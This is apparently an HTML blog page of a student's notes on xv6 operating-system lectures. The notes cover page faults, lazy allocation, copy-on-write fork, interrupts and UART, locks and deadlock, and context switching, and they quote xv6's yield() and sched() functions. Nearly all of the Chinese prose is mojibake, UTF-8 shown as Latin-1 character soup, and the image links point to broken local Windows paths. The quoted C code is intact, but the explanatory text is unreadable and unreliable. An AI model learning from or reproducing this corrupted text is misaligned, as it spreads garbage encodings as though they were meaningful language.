<p>è¿™æ˜¯shç¨‹åºçš„é¡µè¡¨ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹è§è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œæ¯”è¾ƒæœ‰æ”¶è·çš„å°±æ˜¯ï¼Œè®¾ç½®äº†uæƒé™çš„é¡µè¡¨ï¼Œç”¨æˆ·æ€æ‰å¯ä»¥ä½¿ç”¨ï¼Œå…¶æ¬¡æ˜¯é™·é˜±å¸§trapframeè™½ç„¶æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€ä»½ï¼Œä½†æ˜¯æ‰€æœ‰è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€éƒ½æ˜¯ä¸€æ ·çš„<code>#define TRAPFRAME (TRAMPOLINE - PGSIZE)</code>ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220906160934534.png" alt="image-20220906160934534"></p>
<p>åœ¨æ‰§è¡Œ<code>ecall</code>çš„æ—¶å€™ä¼šå…³é—­ä¸­æ–­ï¼Œè¿™æ ·å°±ä¸ä¼šå‘ç”Ÿè¿›ç¨‹åˆ‡æ¢äº†ï¼Œç„¶ååœ¨æ‰§è¡Œ<code>sret</code>çš„æ—¶å€™åˆä¼šæ‰“å¼€ä¸­æ–­ï¼Œå¦‚æœä¸è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå½“ç”¨æˆ·æ€ç¨‹åºé™·å…¥å†…æ ¸æ€çš„æ—¶å€™å¹¶ä¸ä¼šå‘ç”Ÿè¿›ç¨‹åˆ‡æ¢ï¼Œä½†æ˜¯è¿™æ ·åšå¹¶ä¸é€‚åˆæ‰€æœ‰æƒ…å†µï¼Œå½“è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™å°±å¯ä»¥è¿›ç¨‹åˆ‡æ¢ï¼Œæ‰“å¼€ä¸­æ–­å’Œå…³é—­ä¸­æ–­çš„å‡½æ•°åˆ†åˆ«æ˜¯<code>intr_on()</code>å’Œ<code>intr_off()</code>ï¼Œå½“æ‰§è¡Œå®Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™åˆä¼šå…³é—­ä¸­æ–­ã€‚</p>
<h4 id="Lecture8"><a href="#Lecture8" class="headerlink" title="Lecture8"></a>Lecture8</h4><p><strong>é¡µé¢é”™è¯¯(page faults)</strong></p>
<p>å…¶å®å¯ä»¥åˆ©ç”¨é¡µé¢é”™è¯¯é…åˆè™šæ‹Ÿå†…å­˜æ¥å®Œæˆå¥½å¤šæœ‰æ„æ€çš„äº‹æƒ…ï¼Œæ¯”å¦‚è¯´forkçš„å†™æ—¶å¤åˆ¶æˆ–è€…æƒ°æ€§åˆ†é…ã€‚</p>
<p>åœ¨å‘ç”Ÿé¡µé¢é”™è¯¯æ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‰ä¸ªä¿¡æ¯ï¼Œé¦–å…ˆæ˜¯é”™è¯¯åœ°å€ï¼Œå¾—çŸ¥é“é”™è¯¯åœ°å€æ‰èƒ½å»å¤„ç†ä»–ï¼Œè¿™ä¸ªé”™è¯¯åœ°å€å°±ä¿å­˜åœ¨<code>stval</code>å¯„å­˜å™¨ä¸­ï¼Œç¬¬äºŒç‚¹å°±æ˜¯å¾—çŸ¥é“é¡µé¢é”™è¯¯çš„ç±»å‹ï¼Œè¿™ä¸ªç±»å‹å°±å­˜å‚¨åœ¨<code>scause</code>å¯„å­˜å™¨ä¸­ã€‚ç¬¬ä¸‰ä»¶ç‚¹å¾—çŸ¥é“å¼•èµ·é¡µé¢é”™è¯¯çš„æŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±å­˜å‚¨åœ¨<code>sepc</code>ä¸­ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908204934721.png" alt="image-20220908204934721"></p>
<p><strong>æƒ°æ€§åˆ†é…</strong></p>
<p>æƒ°æ€§åˆ†é…å®é™…å°±æ˜¯ä¸€ä¸ªç©ºå¤´æ”¯ç¥¨ï¼Œå¹¶ä¸åˆ†é…ç‰©ç†å†…å­˜å’Œæ˜ å°„ï¼Œè€Œæ˜¯å…ˆå¢å¤§p-&gt;sz,å½“ä½¿ç”¨è¿™æ®µå†…å­˜çš„æ—¶å€™æ‰æ ¹æ®<code>scause</code>çš„å€¼ç¡®å®šé¡µé¢é”™è¯¯ç±»å‹ç„¶ååˆ†é…å†…å­˜å¹¶ä¸”æ˜ å°„ï¼Œæ‰€ä»¥åœ¨srbkä¸­å¹¶ä¸éœ€è¦æ˜ å°„ï¼Œè€Œæ˜¯å¢å¤§p-&gt;szçš„å€¼å°±å¯ä»¥äº†ï¼Œå¤§æ¦‚æ€è·¯å¦‚ä¸‹å›¾ä»£ç ï¼Œæ¯”è¾ƒå¥½ç†è§£</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908210855042.png" alt="image-20220908210855042"></p>
<p>ä½†æ˜¯è¿™æ ·åˆä¼šå¯¼è‡´å¦ä¸€ä¸ªé”™è¯¯ï¼Œå½“æƒ°æ€§åˆ†é…åï¼Œå¯èƒ½çš„æƒ…å†µå°±æ˜¯æœ‰äº›çœŸçš„åˆ†é…äº†ï¼Œæœ‰çš„æ²¡æœ‰åˆ†é…ï¼Œå½“é‡Šæ”¾è¿™ä¸ªè¿›ç¨‹çš„å†…å­˜çš„å°±æ˜¯åå°±ä¼šå‘ç”Ÿå¦‚ä¸‹bug</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908211459524.png" alt="image-20220908211459524"></p>
<p>ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯é‡Šæ”¾è¿›ç¨‹å†…å­˜çš„æ—¶å€™æ¡ä»¶æ”¾çš„å®½æ¾ä¸€ç‚¹ï¼ŒåŸæœ¬çš„uvnunmapæ˜¯å¦‚æœæ£€æµ‹åˆ°äº†ä¸å­˜åœ¨çš„æ˜ å°„ç›´æ¥<code>panic</code>,æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ<code>continue</code></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908211750910.png" alt="image-20220908211750910"></p>
<p>å¾ˆç†Ÿæ‚‰çš„bssæ®µä¹Ÿå¯ä»¥åˆ©ç”¨æƒ°æ€§åˆ†é…ï¼Œç±»ä¼¼ä¸‹å›¾ï¼Œå…ˆè®©bsså…¨éƒ¨æ˜ å°„åˆ°ä¸€ä¸ªåªæœ‰è¯»æƒé™çš„é¡µé¢ï¼Œå½“æœ‰ä¸€ä¸ªåœ°å€æƒ³è¦å†™å…¥å†…å®¹çš„æ—¶å€™å°±ä¼šè§¦å‘é¡µé¢é”™è¯¯ï¼Œè¿›è€Œå¯ä»¥ç»™ä»–åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚<img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908213940714.png" alt="image-20220908213940714"></p>
<p><strong>COW</strong></p>
<p>copy on writeï¼Œä¹Ÿå°±æ˜¯forkçš„å†™æ—¶å¤åˆ¶æŠ€æœ¯ï¼Œå½“forkçš„æ—¶å€™ï¼ŒæŠŠçˆ¶å­è¿›ç¨‹éƒ½æ˜ å°„åˆ°åŸå…ˆçˆ¶è¿›ç¨‹çš„ç‰©ç†å†…å­˜ä¸Šï¼Œä½†æ˜¯ä»–ä»¬éƒ½æ˜¯<code>r</code>ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908221824481.png" alt="image-20220908221824481"></p>
<p>ç„¶åå½“å­è¿›ç¨‹æƒ³è¦åœ¨è¿™æ®µå†…å­˜ä¸­å†™å…¥å†…å®¹æ—¶å°±ä¼šå‘ç”Ÿé¡µè¡¨é”™è¯¯ï¼Œç„¶åå¯ä»¥é‡æ–°ç”³è¯·ä¸€ä¸ªé¡µé¢ï¼ŒæŠŠå‘ç”Ÿé”™è¯¯çš„é¡µé¢çš„å†…å®¹å¤åˆ¶åˆ°æ–°ç”³è¯·çš„é¡µé¢ä¸Šï¼Œç„¶åæŠŠè¿™ä¸ªé¡µé¢æ˜ å°„åˆ°å­è¿›ç¨‹ä¸­ï¼ŒåŸå…ˆé”™è¯¯çš„è™šæ‹Ÿåœ°å€å°±æŒ‡å‘äº†è¿™ä¸ªæ–°çš„é¡µé¢ï¼Œç„¶åæŠŠçˆ¶è¿›ç¨‹çš„æƒé™å˜æˆ<code>rw</code>,ç„¶åé‡æ–°æ‰§è¡Œå‘ç”Ÿé¡µé¢é”™è¯¯çš„æŒ‡ä»¤ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½¿ç”¨å¾€ä¸€ä¸ªåªè¯»é¡µé¢ä¸­å†™å…¥å†…å®¹æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å†™æ—¶å¤åˆ¶å…¶å®æ˜¯ä¸å‡†ç¡®çš„ï¼Œå› ä¸ºæœ‰äº›é¡µé¢æœ¬æ¥å°±æ˜¯åªè¯»å†…å®¹ï¼Œè¿™æ ·å°±ä¼šç ´åè¿™äº›é¡µé¢çš„å†…å®¹äº†ã€‚åœ¨pteä¸­è¿˜å­˜åœ¨ä¸€ä½å«åš<code>RSW</code>,å¯ä»¥æŠŠè¿™ä¸€ä½è®¾ç½®æˆæ˜¯å¦æ˜¯<code>cow</code>é¡µé¢çš„æ ‡å¿—ã€‚</p>
<p>ä¸Šè¿°çš„<code>cow</code>ç­–ç•¥å¹¶ä¸å®Œç¾ï¼Œå½“ä¸€ä¸ªçˆ¶è¿›ç¨‹forkäº†å¤šä¸ªå­è¿›ç¨‹ä¹‹åï¼Œçˆ¶è¿›ç¨‹exitçš„è¯æ˜¾ç„¶ä¸èƒ½ç›´æ¥é‡Šæ”¾çˆ¶è¿›ç¨‹çš„é¡µé¢ï¼Œå› ä¸ºæ‰€æœ‰å­è¿›ç¨‹éƒ½æŒ‡å‘è¿™äº›é¡µé¢ï¼Œæ‰€ä»¥å¾—ç»™æ¯ä¸ªé¡µé¢åŠ ä¸ªå¼•ç”¨è®¡æ•°ï¼Œå½“è®¡æ•°ä¸º0çš„æ—¶å€™æ‰ä¼šçœŸæ­£é‡Šæ”¾è¿™ä¸ªé¡µé¢ã€‚</p>
<p><strong>æŒ‰éœ€åˆ†é…</strong></p>
<p>æŒ‰éœ€åˆ†é…æ˜¯å†…å­˜æ‰©å±•çš„ç²¾é«“ï¼Œå½“åœ¨å†…å­˜ä¸­åŠ è½½æ–‡ä»¶æ—¶å¹¶ä¸æ˜¯å…¨éƒ¨éƒ½åŠ è½½è¿›å»ï¼Œè€Œæ˜¯æŒ‰éœ€åŠ è½½ï¼Œç„¶åå½“å†…å­˜ç”¨å®Œä¹‹åå†é©±é€ä¸€äº›è¿‘æœŸä¸ç”¨çš„é¡µé¢è…¾å‡ºç©ºé—´ã€‚</p>
<h4 id="Lecture9"><a href="#Lecture9" class="headerlink" title="Lecture9"></a>Lecture9</h4><h5 id="book-read"><a href="#book-read" class="headerlink" title="book read"></a>book read</h5><p>è¿™ä¸€èŠ‚æ˜¯å…³äºä¸­æ–­çš„ï¼Œä»¥å‰æ€»æ˜¯å¯¹ä¸­æ–­æ¨¡æ¨¡ç³Šç³Šçš„ï¼Œä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œé€šè¿‡é˜…è¯»æœ¬èŠ‚å†…å®¹å’Œç½‘ä¸Šçš„èµ„æ–™ï¼Œç»ˆäºå¯¹ä¸­æ–­æœ‰äº†ä¸€ä¸ªè¾ƒä¸ºæ¸…æ™°çš„æ¦‚å¿µäº†ã€‚</p>
<p>ä¸­æ–­å…¶å®å°±æ˜¯åœ¨CPUæ­£åœ¨åšæŸä»¶äº‹çš„æ—¶å€™ï¼Œæ”¶åˆ°äº†é€šçŸ¥å‘Šè¯‰CPUä½ è¦æ”¾ä¸‹æ‰‹å¤´ç°åœ¨åšçš„äº‹ï¼Œå»å¤„ç†å¦ä¸€ä»¶äº‹ï¼ˆå½“ç„¶è¿™ä¸ªæ˜¯ç«‹å³å¤„ç†è¿˜æ˜¯è¿‡ä¸€ä¼šå¤„ç†ä»¥åŠå¦‚ä½•å¤„ç†å–å†³äºä¸­æ–­çš„ç±»å‹ï¼‰ã€‚å¯ä»¥å…ˆæŠŠä¸­æ–­åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯å¤–éƒ¨ä¸­æ–­ï¼Œä¸€ç§æ˜¯å†…éƒ¨ä¸­æ–­ã€‚</p>
<p>å¤–éƒ¨ä¸­æ–­ä¹Ÿå«ç¡¬ä»¶ä¸­æ–­ï¼Œç”±ç¡¬ä»¶å‘cpuå‘å‡ºä¸­æ–­ä¿¡å·ï¼Œç„¶åcpuåœä¸‹æ¥å¤„ç†è¿™ä¸ªä¸­æ–­ï¼Œæ­¤æ—¶cpuæ˜¯çŸ¥é“æ˜¯é‚£ä¸ªè®¾å¤‡å‘å‡ºçš„ä¸­æ–­çš„ï¼Œæœ‰ä¸ªä¸­æ–­å·ï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸­æ–­å·è°ƒç”¨å¯¹åº”çš„ä¸­æ–­é©±åŠ¨ç¨‹åºå¯¹è¿™ä¸ªä¸­æ–­å®Œæˆå¤„ç†ï¼Œè¿™æ ·ä¸€çœ‹cpuå°±åƒä¸€ä¸ªåç«¯ä¸€æ ·ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯å¤„ç†å¯¹åº”äº‹ä»¶ã€‚</p>
<p>å†…éƒ¨ä¸­æ–­å°±æ˜¯æŒ‡cpuå†…éƒ¨å‡ºç°çš„ä¸­æ–­ï¼Œç³»ç»Ÿè°ƒç”¨å°±æ˜¯å†…éƒ¨ä¸­æ–­ã€‚</p>
<h5 id="è¯¾ç¨‹å†…å®¹"><a href="#è¯¾ç¨‹å†…å®¹" class="headerlink" title="è¯¾ç¨‹å†…å®¹"></a>è¯¾ç¨‹å†…å®¹</h5><p>å½“é€šä¸Šç”µä»¥åï¼Œè®¾å¤‡ä¹Ÿæ˜¯åœ¨è¿è¡Œçš„ï¼Œcpuä¹Ÿæ˜¯åœ¨è¿è¡Œçš„ï¼Œä¸¤ä¸ªå¯ä»¥è¯´æ˜¯åœ¨å¹¶è¡Œè¿è¡Œï¼Œæ—¢ç„¶æ˜¯åœ¨å¹¶è¡Œè¿è¡Œï¼Œå°±éœ€è¦å¤„ç†ä¸¤è€…ä¹‹é—´çš„åŒæ­¥æ€§é—®é¢˜ï¼Œè€Œä¸­æ–­å°±å¯ä»¥å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>PCLIæ˜¯cpuå†…éƒ¨çš„ä¸€ä¸ªæ¨¡å—ï¼Œæ˜¯å¯¹å¤–éƒ¨è®¾å¤‡ä¸­æ–­çš„ç®¡ç†è€…ï¼Œ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220920231732880.png" alt="image-20220920231732880"></p>
<p>é©±åŠ¨ç¨‹åºåˆ†ä¸ºä¸Šä¸‹ä¸¤éƒ¨åˆ†ï¼Œä¸‹åŠéƒ¨åˆ†æ˜¯ä¸­æ–­å¤„ç†ç¨‹åºï¼Œä¸ŠåŠéƒ¨åˆ†åœ¨æˆ‘çœ‹æ¥æ˜¯ç¼“å­˜åŒºï¼Œæ¯”å¦‚<code>uart</code>è®¾å¤‡çš„å¯ä»¥æŠŠæ¥æ”¶æˆ–è€…å‘é€çš„å­—ç¬¦ä¸²æ”¾åœ¨ä¸ŠåŠéƒ¨åˆ†ï¼Œç„¶åå°±å¯ä»¥å®Œæˆäº†è®¾å¤‡å’Œcpuçš„è§£è€¦ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220920233006328.png" alt="image-20220920233006328"></p>
<p><code>$ ls</code>çš„å·¥ä½œè¿‡ç¨‹ï¼Œçœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œå…³äºuartçš„éƒ¨åˆ†ã€‚</p>
<p>åç»­,ç¨å¾®ç†è§£äº†uartï¼Œä»–æ˜¯ä¸€ä¸ªç”¨äºè¾…åŠ©è®¡ç®—æœºå’Œè®¾å¤‡é€šä¿¡çš„èŠ¯ç‰‡ï¼Œå½“è®¡ç®—æœºå‘è®¾å¤‡å‘é€æ•°æ®çš„æ—¶å€™ï¼Œé€šè¿‡uartä¸²å£æŠŠå­—èŠ‚è½¬æ¢æˆä¸€ä½ä¸€ä½çš„ï¼Œç„¶åè®¾å¤‡æŠŠä¸€ä½ä¸€ä½çš„æ•°æ®ä¼ é€’ç»™è®¡ç®—æœºçš„æ—¶å€™ï¼Œé€šè¿‡uartä¸²å£æŠŠä¸€ä½ä¸€ä½çš„æ•°æ®è½¬åŒ–æˆå­—èŠ‚æµä¼ é€’ç»™è®¡ç®—æœºã€‚</p>
<p>æ‰“å°<code>$</code>çš„æµç¨‹å°±æ˜¯å…ˆæŠŠ<code>$</code>æ”¾å…¥åˆ°uartçš„ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼ŒæŠŠå‚¨å­˜çš„å­—ç¬¦å‘é€åˆ°å¦ä¸€ä¸ªuartä¸­ï¼Œè¿™ä¸ªuarté“¾æ¥åˆ°äº†è™šæ‹Ÿæ§åˆ¶å°ã€‚</p>
<p>å‘é€<code>ls</code>æ—¶ï¼Œé¦–å…ˆé”®ç›˜ä¼šæŠŠå­—ç¬¦å‘é€åˆ°ä¸ä¹‹é“¾æ¥çš„uartä¸Šï¼Œç„¶åuartå‘é€æ•°æ®åˆ°å¦ä¸€ä¸ªuartä¸Šï¼Œè¿™ä¸ªuartæ‹¿åˆ°æ•°æ®åå°±ä¼šäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼Œå‘Šè¯‰è®¡ç®—å™¨é”®ç›˜è¾“å‡ºäº†å­—ç¬¦ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220921001534980.png" alt="image-20220921001534980"></p>
<p>å½“ä¸­æ–­è¦è¢«æŸä¸€ä¸ªcpuå¤„ç†çš„æ—¶å€™ï¼Œè¿™ä¸ªcpuå¯¹åº”å¯„å­˜å™¨çš„å˜åŒ–å¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221005194949276.png" alt="image-20221005194949276"></p>
<p>ä¸­æ–­æœ‰ç‚¹éš¾ç†è§£ï¼Œè¯¾ä¸Šçš„å†…å®¹åŠæ‡‚ä¸æ‡‚çš„ï¼Œæœ‰æ—¶é—´çœ‹çœ‹æºç å†ç†è§£ä¸€ä¸‹å§ã€‚</p>
<h4 id="Lecture10"><a href="#Lecture10" class="headerlink" title="Lecture10"></a>Lecture10</h4><p>è¿™èŠ‚è¯¾çš„ä¸»è¦å†…å®¹æ˜¯é”</p>
<p>éœ€è¦é”çš„ä¸»è¦åŸå› å°±æ˜¯cpuæ˜¯å¤šæ ¸çš„ï¼Œæ¯ä¸ªæ ¸éƒ½å¯èƒ½æœ‰ä¸€ä¸ªç¨‹åºæµï¼Œè¿™äº›ç¨‹åºæµå¯èƒ½è®¿é—®åŒä¸€ä¸ªå…±äº«æ•°æ®ï¼Œå†…æ ¸ä¸­å°±æœ‰å¾ˆå¤šå…¨å±€æ•°æ®ç»“æ„ï¼Œå½“å¤šä¸ªè¿›ç¨‹åœ¨ä¸åŒæ ¸å¿ƒä¸Šè¿è¡Œç„¶ååŒæ—¶è¿›å…¥ç³»ç»Ÿè°ƒç”¨å°±å¯èƒ½å‘ç”ŸåŒæ—¶è®¿é—®å…±äº«æ•°æ®çš„é—®é¢˜ã€‚æ€»è€Œè¨€ä¹‹å°±æ˜¯è§£å†³å¹¶è¡Œæ€§ç³»ç»Ÿä¸­è®¿å­˜å…±äº«æ•°æ®çš„é—®é¢˜ã€‚</p>
<p>é”ä¼šåºåˆ—åŒ–æ“ä½œï¼Œå³å¯ä»¥æ§åˆ¶å¹¶è¡Œç³»ç»Ÿå…³äºåŒä¸€ä¸ªå…±äº«æ•°æ®çš„è®¿é—®é¡ºåºï¼Œé€šä¸€ä¸ªæ—¶åˆ»å†…ï¼Œåªæœ‰ä¸€ä¸ªæ ¸å¯ä»¥è®¿é—®å…±äº«æ•°æ®æ®µï¼Œå½“ç„¶ï¼Œè¿™åŠ¿å¿…ä¼šé€ æˆæ€§èƒ½æŸå¤±ã€‚</p>
<p>æ¯”å¦‚freelistå°±å¯èƒ½é€ æˆæ¡ä»¶ç«äº‰ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221010104133931.png" alt="image-20221010104133931"></p>
<p>åœ¨xv6ä¸­å…³äºé”ä¸»è¦æœ‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨<code>acquire()</code>å’Œ<code>release()</code>ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯è·å¾—é”ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯é‡Šæ”¾é”ã€‚</p>
<p>é”å¯ä»¥æœ‰ç²—ç²’åº¦é”å’Œç»†ç²’åº¦é”</p>
<p>é”å¯ä»¥è§£å†³æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿä¼šå¸¦æ¥è‡ªå·±çš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„æ­»é”é—®é¢˜ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011001902538.png" alt="image-20221011001902538"></p>
<p>åŠ é”è¿™ä¸ªè¿‡ç¨‹å¿…é¡»æ˜¯åŸå­åºåˆ—çš„ï¼Œåœ¨xv6ä¸­ï¼Œä½¿ç”¨çš„æ˜¯amoswapæŒ‡ä»¤å®ŒæˆåŠ é”ï¼ŒåŸç†å°±æ˜¯amoswapä¼šå¯¹addrè¿™ä¸ªåœ°å€åŠ é”ï¼Œç„¶åæ‰§è¡Œå®Œåé¢ä¸‰ä¸ªåå†è§£é”ï¼Œæœ€ååˆ¤æ–­r2çš„å€¼æ¥åˆ¤æ–­æ˜¯å¦è·å¾—é”äº†ã€‚å¦‚æœç­‰äº0å°±æ˜¯è·å¾—é”ï¼Œå¦‚æœç­‰äº1å°±æ˜¯æ²¡æœ‰è·å¾—é”ï¼Œç§’å•Šã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011010830326.png" alt="image-20221011010830326"></p>
<p>è€å¸ˆæåˆ°çš„ä¸€ä¸ªè§£å†³æ­»é”é—®é¢˜çš„åŠæ³•æ˜¯æŠŠæ‰€æœ‰é”è¿›è¡Œä¸€ä¸ªæ’åºï¼Œç„¶åè¿›ç¨‹è·å¾—å¤šä¸ªé”çš„æ—¶å€™å°±æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥è·å–ï¼Œè¿™æ ·ç¡®å®å¯ä»¥é¿å…æ¯”è¾ƒå…¸å‹çš„æ­»é”é—®é¢˜ã€‚ä½†æ˜¯æ’åºé—®é¢˜ä¼¼ä¹ä¹Ÿå¾ˆéº»çƒ¦ï¼Œéœ€è¦ä¸€ä¸ªå¥½çš„ç­–ç•¥ã€‚</p>
<p>é”å¯¹æ€§èƒ½è‚¯å®šä¼šé€ æˆæŸå¤±ï¼Œè¦æƒ³å°½å¯èƒ½ä¸é€ æˆæŸå¤±ï¼Œåªèƒ½å°½å¯èƒ½å¯¹æŠŠå…±äº«æ•°æ®ç»“æ„ç»†åŒ–ï¼Œç„¶åé”å°±èƒ½å°½å¯èƒ½çš„ç»†ç²’åº¦ï¼Œæ€§èƒ½å°±èƒ½æŸå¤±çš„å°½å¯èƒ½å°‘ï¼Œä½†æ˜¯è¿™æ˜¯éå¸¸å¤æ‚çš„ï¼Œç³»ç»Ÿè¶Šå¤§è¶Šä¸å¥½å®ç°ï¼Œè€å¸ˆç»™å‡ºçš„è§‚ç‚¹æ˜¯å…ˆä½¿ç”¨ç²—ç²’åº¦çš„é”ï¼Œç„¶åçœ‹æœ‰æ²¡æœ‰æ¡ä»¶ç«äº‰ï¼Œå†ç»†åŒ–é”ã€‚</p>
<p>æ‰€æœ‰æ ¸å¿ƒæƒ³è¦è¿›è¡Œå†…å­˜æ“ä½œéƒ½ä¼šç»è¿‡ä¸€ä¸ªå†…å­˜æ§åˆ¶å™¨ï¼Œç¡¬ä»¶é”å°±æ˜¯åˆ©ç”¨æ­¤å®Œæˆå¯¹ç‰¹å®šåœ°å€åŠ é”ï¼Œè®©æ‰§è¡Œå‡ æ­¥æ“ä½œåå¯¹æ­¤è§£é”ã€‚</p>
<h4 id="Lecture11"><a href="#Lecture11" class="headerlink" title="Lecture11"></a>Lecture11</h4><h5 id="book-read-1"><a href="#book-read-1" class="headerlink" title="book-read"></a>book-read</h5><p><strong>ä¸Šä¸‹æ–‡åˆ‡æ¢</strong></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011163736314.png" alt="image-20221011163736314"></p>
<p>æ¯ä¸ªcpuéƒ½æœ‰è‡ªå·±çš„è°ƒåº¦ç¨‹åºçº¿ç¨‹ä»¥åŠè°ƒåº¦ç¨‹åºæ ˆï¼Œå…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨cpu-&gt;contextä¸­ï¼Œå½“shellè¿›ç¨‹åˆ‡æ¢åˆ°catè¿›ç¨‹çš„æ—¶å€™ï¼Œé¦–å…ˆåœ¨shellçš„å†…æ ¸çº¿ç¨‹ä¸­è°ƒç”¨<code>yield()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">yield</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  acquire(&amp;p-&gt;lock);</span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line">  sched();</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆæŠŠå½“å‰è¿›ç¨‹çš„çŠ¶æ€ä½æ”¹æˆ<code>RUNNABLE</code>,ç„¶åè°ƒç”¨<code>sched()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> intena;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holding(&amp;p-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;sched p-&gt;lock&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff != <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;sched locks&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNING)</span><br><span class="line">    panic(<span class="string">&quot;sched running&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get())</span><br><span class="line">    panic(<span class="string">&quot;sched interruptible&quot;</span>);</span><br><span class="line"></span><br><span class="line">  intena = mycpu()-&gt;intena;</span><br><span class="line">  swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context);</span><br><span class="line">  mycpu()-&gt;intena = intena;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯è°ƒç”¨äº†<code>swtch()</code>å‡½æ•°æ¥ä¿å­˜ä¸Šä¸‹æ–‡å¹¶æ¢å¤è°ƒåº¦çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œæ‰§è¡Œè°ƒåº¦çº¿ç¨‹ã€‚</p>
<p>swtchä¸­ä¸»è¦å°±æ˜¯sdå’Œld,å½“æœ€åæ‰§è¡Œretçš„æ—¶å€™å°±è¿”å›åˆ°äº†è°ƒåº¦ç¨‹åºçº¿ç¨‹ä¸Šä¸‹æ–‡äº†ã€‚</p>
